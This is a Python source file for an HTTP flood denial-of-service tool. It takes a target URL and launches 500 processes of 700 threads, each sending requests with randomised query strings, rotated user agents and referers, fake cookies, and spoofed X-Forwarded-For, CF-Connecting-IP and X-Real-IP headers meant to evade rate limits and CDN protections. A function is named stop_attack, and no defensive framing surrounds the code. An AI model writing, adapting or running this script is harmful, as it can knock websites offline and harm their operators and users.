import sys
import threading
import random
import re
import ipaddress
import time
from datetime import datetime, timedelta
import urllib.request
import urllib.error
import multiprocessing

url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0

def load_useragents():
    with open('useragents.txt', 'r') as f:
        return f.read().splitlines()

def load_referers():
    with open('referers.txt', 'r') as f:
        return f.read().splitlines()

headers_useragents = load_useragents()
headers_referers = load_referers()

def generate_ip(block):
    network = ipaddress.ip_network(block, strict=False)
    return str(ipaddress.ip_address(random.randint(int(network.network_address) + 1, int(network.broadcast_address) - 1)))

def generate_cookie():
    expires = (datetime.now() + timedelta(days=1)).strftime('%a, %d-%b-%Y %H:%M:%S GMT')
    return f"sessionid=value{random.randint(1, 100000)}; Expires={expires}; Domain={host}; Path=/; Secure; HttpOnly"

def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def inc_counter():
    global request_counter
    request_counter += 1

def stop_attack():
    global flag
    flag = 2

def httpcall(url, isp_blocks, real_ips):
    request_url = url + ("&" if url.count("?") > 0 else "?") + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
        'X-Forwarded-For': generate_ip(random.choice(isp_blocks)),
        'Cookie': generate_cookie(),
        'CF-Connecting-IP': generate_ip(random.choice(real_ips)),
        'X-Real-IP': generate_ip(random.choice(real_ips)),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'
    }
    try:
        req = urllib.request.Request(request_url, headers=headers)
        urllib.request.urlopen(req)
    except urllib.error.URLError:
        pass
    else:
        inc_counter()

class HTTPThread(threading.Thread):
    def __init__(self, url, isp_blocks, real_ips):
        super().__init__()
        self.url = url
        self.isp_blocks = isp_blocks
        self.real_ips = real_ips

    def run(self):
        while flag < 2:
            httpcall(self.url, self.isp_blocks, self.real_ips)
            time.sleep(random.uniform(0.1, 0.5))

def worker(url, isp_blocks, real_ips):
    threads = []
    for _ in range(700):
        t = HTTPThread(url, isp_blocks, real_ips)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: script.py <url>")
        sys.exit()
    url = sys.argv[1]
    if url.count("/") == 2:
        url += "/"
    m = re.search('(https?://)?([^/]*)/?.*', url)
    host = m.group(2)
    isp_blocks = ['192.168.0.0/24', '10.0.0.0/8', '172.16.0.0/12']
    real_ips = ['192.168.0.1', '10.0.0.1', '172.16.0.1']
    
    processes = []
    for _ in range(500): # Alterado para 500 processos conforme solicitado
        process = multiprocessing.Process(target=worker, args=(url, isp_blocks, real_ips))
        processes.append(process)
        process.start()
        
    for process in processes:
        process.join()
        
    try:
        stop_attack()
    except KeyboardInterrupt:
        stop_attack()